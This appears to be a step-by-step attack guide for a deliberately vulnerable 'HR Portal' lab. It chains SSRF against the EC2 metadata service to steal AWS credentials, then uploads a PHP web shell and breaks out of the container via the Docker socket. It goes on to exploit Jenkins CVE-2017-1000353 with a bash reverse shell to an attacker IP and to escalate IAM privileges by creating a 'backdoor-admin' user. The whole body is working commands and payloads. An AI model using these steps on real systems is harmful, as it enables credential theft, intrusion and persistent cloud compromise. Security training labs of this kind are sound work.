
# Attack 2: Server-Side Request Forgery (SSRF) to Remote Code Execution (RCE)

This guide walks through exploiting SSRF vulnerabilities in the HR Portal to gain RCE.

## Step 1: Access the Document Upload Page

1. Log in to the HR Portal (you can use SQL injection from Attack 1)
2. Navigate to the Document Upload page (`/documents`)

## Step 2: Basic SSRF Exploration

1. Select any file for upload (content doesn't matter)
2. In the "Upload Destination" dropdown, select "Debug - EC2 Metadata (SSRF)" or:
   - Select "Custom Location" and enter `http://169.254.169.254/latest/meta-data/`
3. Click "Send SSRF Request"
4. The response will display EC2 metadata in the preview window

## Step 3: Extract AWS Credentials via SSRF

1. Set the upload URL to: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
2. Click "Send SSRF Request" to see the IAM role name (e.g., `hr-portal-ec2-role`)
3. Set the URL to: `http://169.254.169.254/latest/meta-data/iam/security-credentials/hr-portal-ec2-role`
4. Click "Send SSRF Request" again to obtain:
   - `AccessKeyId`
   - `SecretAccessKey`
   - `Token`
5. Copy these credentials for later use

## Step 4: Web Shell Upload via SSRF

1. Select "Web Server Root (PHP)" from the dropdown
2. Create a simple PHP web shell file:
```php
<?php
  if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
  }
?>
```
3. Save this as `shell.php` and upload it
4. Click "Upload Web Shell"
5. The file will be uploaded to `/var/www/html/shell.php`
6. Test your web shell by navigating to: `/var/www/html/shell.php?cmd=id`

## Step 5: Container Environment Exploration

1. Use your web shell to explore the container:
```
?cmd=env
?cmd=ls -la /
?cmd=cat /etc/passwd
?cmd=ps aux
```

2. Check for Docker socket:
```
?cmd=ls -la /var/run/docker.sock
```

## Step 6: Container Breakout Techniques

### Method 1: Using Docker Socket (if available)

1. Check if the Docker socket is accessible:
```
?cmd=ls -la /var/run/docker.sock
```

2. If available, create a new container with host filesystem mounted:
```
?cmd=curl -X POST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"alpine","Cmd":["/bin/sh","-c","cat /etc/shadow > /mnt/pwned"],"HostConfig":{"Binds":["/:/mnt"]}}' http://localhost/containers/create
```

3. Start the container:
```
?cmd=curl -X POST --unix-socket /var/run/docker.sock http://localhost/containers/[CONTAINER_ID]/start
```

### Method 2: Privileged Mode Exploitation

1. Check if container is running in privileged mode:
```
?cmd=cat /proc/self/status | grep CapEff
```

2. If it shows full capabilities, try mounting the host filesystem:
```
?cmd=mkdir -p /tmp/host_root
?cmd=mount /dev/sda1 /tmp/host_root
?cmd=ls -la /tmp/host_root
```

### Method 3: Kernel Exploit

1. Check kernel version:
```
?cmd=uname -a
```

2. Search for and download a matching kernel exploit using your web shell
3. Compile and execute it to break out of the container

## Step 7: Network Scanning from Inside the Container

Once you have shell access:

1. Install network tools if not already available:
```
?cmd=apt-get update && apt-get install -y nmap netcat
```

2. Scan the internal network:
```
?cmd=nmap -sT -p 8080,22 10.0.0.0/24
```

3. Discover the Jenkins server (typically on port 8080)

## Step 8: Jenkins Exploitation

1. Verify Jenkins is accessible:
```
?cmd=curl http://[JENKINS_IP]:8080
```

2. Download the exploit code for Jenkins 2.32.1 (CVE-2017-1000353):
```
?cmd=wget https://github.com/vulhub/CVE-2017-1000353/archive/refs/heads/master.zip
?cmd=unzip master.zip
?cmd=cd CVE-2017-1000353-master
```

3. Create a reverse shell payload:
```
?cmd=echo 'bash -i >& /dev/tcp/[YOUR_IP]/4444 0>&1' > payload.sh
```

4. Set up a listener on your attacking machine:
```
nc -lvnp 4444
```

5. Compile and execute the exploit:
```
?cmd=javac -cp "commons-io-2.5.jar:commons-collections-3.2.2.jar:commons-codec-1.9.jar" *.java
?cmd=java -cp ".:commons-io-2.5.jar:commons-collections-3.2.2.jar:commons-codec-1.9.jar" Payload payload.sh
?cmd=python2 exploit.py http://[JENKINS_IP]:8080 payload.ser
```

## Step 9: Privilege Escalation on Jenkins Server

Once you have a shell on the Jenkins server:

1. Check for SUID binaries:
```
find / -perm -u=s -type f 2>/dev/null
```

2. Check for sudo permissions:
```
sudo -l
```

3. Look for misconfigured services:
```
ps aux | grep root
```

4. Check for password files in Jenkins home:
```
find /var/lib/jenkins -name "*.xml" | xargs grep -l "password"
```

## Step 10: AWS IAM Privilege Escalation

Using the AWS credentials obtained earlier:

1. Configure AWS CLI:
```
export AWS_ACCESS_KEY_ID=[AccessKeyId]
export AWS_SECRET_ACCESS_KEY=[SecretAccessKey]
export AWS_SESSION_TOKEN=[Token]
export AWS_DEFAULT_REGION=us-east-1
```

2. Check IAM permissions:
```
aws iam get-user
aws iam list-attached-user-policies --user-name $(aws iam get-user --query 'User.UserName' --output text)
```

3. Exploit iam:UpdateAssumeRolePolicy and sts:AssumeRole permissions:
```
# Create a policy document allowing you to assume the role
cat > trust-policy.json <<EOF
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "AWS": "*"
      },
      "Action": "sts:AssumeRole"
    }
  ]
}
EOF

# Update the assume role policy of an existing role 
aws iam update-assume-role-policy --role-name hr-portal-ec2-role --policy-document file://trust-policy.json

# Assume the role to get elevated permissions
aws sts assume-role --role-arn arn:aws:iam::$(aws sts get-caller-identity --query 'Account' --output text):role/hr-portal-ec2-role --role-session-name privilege-escalation
```

4. Create a new admin user:
```
# Configure new credentials from the assumed role
export AWS_ACCESS_KEY_ID=[new AccessKeyId]
export AWS_SECRET_ACCESS_KEY=[new SecretAccessKey]
export AWS_SESSION_TOKEN=[new Token]

# Create admin user
aws iam create-user --user-name backdoor-admin

# Create access key for new user
aws iam create-access-key --user-name backdoor-admin

# Attach admin policy to new user
aws iam attach-user-policy --user-name backdoor-admin --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

## Troubleshooting SSRF Attacks

If your SSRF attacks aren't working:

1. Make sure you're using exact URLs with correct case sensitivity
2. Try with and without trailing slashes
3. Check the browser console for errors
4. Try different metadata paths like:
   - `http://169.254.169.254/latest/meta-data/ami-id`
   - `http://169.254.169.254/latest/meta-data/hostname`
5. Note that browser CORS issues won't affect actual server-side SSRF

## CORS Limitations Note

In a real server-side vulnerability, CORS restrictions don't apply because requests come from the server, not the browser. If you see CORS errors, this is normal browser behavior but wouldn't affect an actual attack where requests originate from the server.
